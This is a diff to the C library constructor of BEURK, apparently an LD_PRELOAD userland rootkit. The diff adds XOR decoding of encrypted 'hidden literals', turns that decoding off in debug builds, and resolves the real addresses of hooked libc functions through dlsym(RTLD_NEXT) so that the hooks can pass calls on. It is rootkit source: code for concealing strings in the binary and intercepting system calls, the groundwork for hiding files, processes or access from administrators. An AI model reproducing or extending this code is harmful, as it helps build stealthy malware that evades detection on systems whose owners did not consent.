@@ -18,19 +18,31 @@
  * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
  */
 
-#include <string.h>
-#include "beurk.h"
+#include <string.h> /* strlen() */
+#include <dlfcn.h> /* dlsym(), dlerror() */
+#include "beurk.h" /* DEBUG(), prototype */
+#include "config.h" /* XOR_KEY, NUM_LITERALS, __hidden_literals, ... */
+
 
 /** xorify a string whith XOR_KEY
  * (XOR_KEY is a macro defined in BEURK config file
+ *
+ * NOTE: disabled on debug mode (as on builder)
  */
-static void     xor(char *p) {
-    unsigned int i;
+#if DEBUG_LEVEL > 0
+# define xor(...)
+#else
+static void     xor(char *str) {
+    size_t      i;
+    size_t      len;
 
-    for(i = 0; i < strlen(p); i++) {
-        p[i] ^= XOR_KEY;
+    len = strlen(str);
+    for(i = 0; i < len; i++) {
+        str[i] ^= XOR_KEY;
     }
 }
+#endif
+
 
 /** re-xorify hidden literals.
  * hidden literals are all string literals used in the library
@@ -41,16 +53,39 @@ static void     xor(char *p) {
  * BEURK config file.
  */
 static void     init_hidden_literals(void) {
-    int     i;
+    int         i;
 
-    for (i=0; i<NUM_LITERALS; i++) {
+    for (i = 0; i < NUM_LITERALS; i++) {
         xor(__hidden_literals[i]);
     }
 }
 
+
+/** retrieve native function pointers of hooked functions
+ * it feeds __non_hooked_symbols table from function names
+ * (stored at the end of __hidden_literals).
+ *
+ * NOTE: If not called, all `REAL_<NAME>` macros will point
+ * to an invalid location.
+ */
+static void     init_non_hooked_symbols(void) {
+    int         i, j;
+    char        *func_name;
+
+    i = 0;
+    j = NUM_LITERALS - NUM_HOOKS;
+    while (j < NUM_LITERALS) {
+        func_name = __hidden_literals[j];
+        __non_hooked_symbols[i] = dlsym(RTLD_NEXT, func_name);
+        i++;
+        j++;
+    }
+}
+
+
 /** library constructor
  */
 void            init(void) {
-    DEBUG("init() constructor loaded");
     init_hidden_literals();
+    init_non_hooked_symbols();
 }
